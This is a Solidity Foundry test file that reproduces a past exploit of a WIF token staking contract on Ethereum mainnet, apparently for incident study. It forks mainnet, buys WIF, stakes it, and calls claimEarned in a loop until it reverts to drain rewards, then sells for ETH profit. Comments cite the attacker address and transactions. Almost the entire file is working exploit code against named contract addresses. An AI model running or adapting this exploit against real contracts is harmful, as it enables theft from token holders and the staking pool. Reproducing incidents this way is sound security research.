pragma solidity ^0.8.10;

import "../basetest.sol";
import "./../interface.sol";

// Profit : ~3.4 ETH
// Attacker: https://etherscan.io/address/0x394ba273315240510b61ca22ba152e3478a45892
// Attack Contract: https://etherscan.io/address/0x93d4f6f84d242c7959f8d1f1917ddbc9fb925ada
// TX1 : https://etherscan.io/tx/0xda8f6a4bed7e5689a343d111632d37480c0316f1d20b732803c4bd482823e284
// TX2 : https://etherscan.io/tx/0x58424115c6576b19cfb78b0b7ff00e0c13daa06d259f2a67210c112731519e09

// GUY : https://x.com/ChainAegis/status/1802550962977964139


interface WIFStaking is IERC20 {
    function stake(uint256 _stakingId, uint256 _amount) external;
    function claimEarned(uint256 _stakingId, uint256 _burnRate) external;
}

contract WIFCOIN_ETHExploit is BaseTestWithBalanceLog {
    WIFStaking WifStake = WIFStaking(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99);
    IERC20 Wif = IERC20(0xBFae33128ecF041856378b57adf0449181FFFDE7);

    Uni_Router_V2 router = Uni_Router_V2(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));
    uint256 ethFlashAmt = 0.3 ether;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 20_103_189);
        Wif.approve(address(router), type(uint256).max);
        Wif.approve(address(WifStake), type(uint256).max);
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //Paths
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(router.WETH()); // weth
        buyPath[1] = address(Wif); // token
        address[] memory sellPath = new address[](2);
        sellPath[0] = buyPath[1];
        sellPath[1] = buyPath[0];

        //set ethbal to 0.3 eth to buy tokens
        vm.deal(address(this), ethFlashAmt);
        router.swapExactETHForTokens{value: ethFlashAmt}(0, buyPath, address(this), block.timestamp);

        WifStake.stake(3, Wif.balanceOf(address(this)));
        while (true) {
            try WifStake.claimEarned(3, 10) {}
            catch {
                break;
            }
        }

        router.swapExactTokensForETH(Wif.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp);

        //Remove initial flash eth to get actual ETH profit
        vm.deal(address(this), address(this).balance - ethFlashAmt);
    }
}
